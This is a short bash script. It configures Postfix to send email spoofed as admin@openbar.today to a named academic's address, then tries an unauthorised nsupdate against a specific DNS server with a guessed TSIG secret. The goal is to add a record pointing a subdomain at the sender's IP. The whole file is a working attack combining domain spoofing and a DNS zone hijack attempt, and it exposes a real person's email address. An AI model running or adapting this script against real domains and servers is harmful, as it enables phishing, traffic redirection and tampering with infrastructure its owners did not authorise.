#!/bin/bash

TARGET="openbar.today"
ADMIN_EMAIL="maciej.korczynski@univ-grenoble-alpes.fr"
MY_IP=$(curl -s ifconfig.me)

# Setup postfix
sudo apt install postfix mailutils -y

# Configure postfix
sudo cat > /etc/postfix/main.cf << EOF
myhostname = $TARGET
mydomain = $TARGET
myorigin = \$mydomain
inet_interfaces = all
inet_protocols = all
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
smtpd_banner = \$myhostname ESMTP
EOF

# Create email content
cat > email.txt << EOF
From: admin@$TARGET
To: $ADMIN_EMAIL
Subject: DNS Zone Update Test

Testing DNS zone update capability from spoofed domain.
My server IP: $MY_IP
EOF

# Send email
sendmail $ADMIN_EMAIL < email.txt

# Try zone update with key
echo "key openbar.today { algorithm hmac-md5; secret \"test\"; };" > key.conf
nsupdate -k key.conf << EOF
server 129.88.46.51
zone openbar.today
update add test.$TARGET 300 A $MY_IP
send
EOF